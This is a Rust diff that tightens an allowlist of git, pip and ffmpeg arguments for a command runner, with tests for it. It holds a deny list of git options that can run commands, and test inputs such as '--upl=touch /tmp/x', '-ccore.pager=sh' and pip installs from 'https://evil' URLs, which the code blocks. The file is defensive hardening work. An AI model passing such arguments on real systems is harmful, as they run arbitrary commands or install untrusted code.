@@ -41,31 +41,65 @@ fn is_version(args: &[String]) -> bool {
   args.len() == 1 && matches!(args[0].as_str(), "--version" | "-v" | "-V" | "version")
 }
 
-/// Git flags that turn an otherwise-harmless subcommand into command
+/// Long git options that turn an otherwise-harmless subcommand into command
 /// execution or an arbitrary file write (`--upload-pack=<cmd>`,
-/// `clone -u <cmd>`, `--output=<file>`, `-c core.sshCommand=...`, `ext::`).
+/// `--output=<file>`, `--config`, ...).
+const GIT_DANGEROUS_LONG_OPTIONS: &[&str] = &[
+  "--upload-pack",
+  "--receive-pack",
+  "--exec",
+  "--output",
+  "--config",
+  "--config-env",
+  "--template",
+  "--ext-diff",
+  "--separate-git-dir",
+];
+
 fn git_arg_is_dangerous(arg: &str) -> bool {
   let lower = arg.to_ascii_lowercase();
-  lower.contains("ext::")
-    || lower.starts_with("--upload-pack")
-    || lower.starts_with("--receive-pack")
-    || lower.starts_with("--exec")
-    || lower.starts_with("--output")
-    || lower.starts_with("--config")
-    || lower.starts_with("--template")
-    || lower.starts_with("--ext-diff")
-    || lower == "-c"
-    || lower == "-u"
+  if lower.contains("ext::") {
+    return true;
+  }
+  if let Some(long) = lower.strip_prefix("--") {
+    // Git accepts any unambiguous prefix of a long option (`--upl=cmd` means
+    // `--upload-pack=cmd`), so compare the option name, not the full string.
+    let name = format!("--{}", long.split('=').next().unwrap_or(""));
+    if name.len() <= 2 {
+      return false;
+    }
+    return GIT_DANGEROUS_LONG_OPTIONS
+      .iter()
+      .any(|danger| danger.starts_with(name.as_str()) || name.starts_with(danger));
+  }
+  // Short options can be attached or bundled (`-uCMD`, `-cfoo=bar`, `-qu`):
+  // refuse any short-option cluster containing `u` (upload-pack for clone/
+  // fetch) or `c` (config override). None of the app's own git calls use them.
+  if let Some(cluster) = arg.strip_prefix('-') {
+    let flags: String = cluster
+      .chars()
+      .take_while(|c| c.is_ascii_alphabetic())
+      .collect();
+    return flags.contains('u') || flags.contains('c');
+  }
+  false
 }
 
 fn pip_args_allowed(args: &[String]) -> bool {
   first_is(args, &["install", "list", "show", "freeze", "--version"])
     && !args.iter().any(|a| {
       let lower = a.to_ascii_lowercase();
+      // Alternate indexes / link sources, and URL or VCS requirements, would
+      // pull code from anywhere instead of PyPI.
       lower.starts_with("--index-url")
         || lower.starts_with("--extra-index-url")
-        || lower == "-i"
+        || lower.starts_with("-i")
         || lower.starts_with("--trusted-host")
+        || lower.starts_with("--find-links")
+        || lower.starts_with("-f")
+        || lower.contains("://")
+        || lower.contains('@')
+        || lower.starts_with("git+")
     })
 }
 
@@ -179,7 +213,12 @@ pub(crate) fn allowed_args(program: &str, args: &[String]) -> bool {
       args,
       &["list", "ps", "show", "pull", "run", "--version", "-v"],
     ),
-    "ffmpeg" | "ffmpeg.exe" | "ffprobe" | "ffprobe.exe" => true,
+    // Plugins may launch ffmpeg under their own manifest rules (plugin_runtime
+    // checks only allowed_program). Through the generic command runner it can
+    // read network inputs and write anywhere, so only version checks pass.
+    "ffmpeg" | "ffmpeg.exe" | "ffprobe" | "ffprobe.exe" => {
+      args.len() == 1 && matches!(args[0].as_str(), "-version" | "--version")
+    }
     _ => false,
   }
 }
@@ -389,6 +428,52 @@ mod tests {
     ));
     assert!(allowed_args("git", &v(&["add", "-A"])));
     assert!(allowed_args("git", &v(&["revert", "HEAD", "--no-edit"])));
+  }
+
+  #[test]
+  fn git_blocks_abbreviated_and_attached_options() {
+    assert!(!allowed_args(
+      "git",
+      &v(&["clone", "--upl=touch /tmp/x", "repo"])
+    ));
+    assert!(!allowed_args(
+      "git",
+      &v(&["fetch", "--upload=sh", "origin"])
+    ));
+    assert!(!allowed_args("git", &v(&["clone", "-usch", "repo"])));
+    assert!(!allowed_args("git", &v(&["log", "-ccore.pager=sh"])));
+    assert!(!allowed_args("git", &v(&["log", "--out=/tmp/x"])));
+    assert!(allowed_args(
+      "git",
+      &v(&["log", "--oneline", "--max-count=5"])
+    ));
+    assert!(allowed_args("git", &v(&["status", "--porcelain"])));
+  }
+
+  #[test]
+  fn pip_and_ffmpeg_are_restricted() {
+    assert!(!allowed_args(
+      "pip",
+      &v(&["install", "git+https://evil/x.git"])
+    ));
+    assert!(!allowed_args(
+      "pip",
+      &v(&["install", "pkg @ https://evil/x.whl"])
+    ));
+    assert!(!allowed_args(
+      "pip",
+      &v(&["install", "--find-links", "https://evil", "x"])
+    ));
+    assert!(!allowed_args(
+      "pip",
+      &v(&["install", "-fhttps://evil", "x"])
+    ));
+    assert!(allowed_args("pip", &v(&["install", "requests"])));
+    assert!(!allowed_args(
+      "ffmpeg",
+      &v(&["-i", "http://x", "/etc/out.mp4"])
+    ));
+    assert!(allowed_args("ffmpeg", &v(&["-version"])));
   }
 
   #[test]
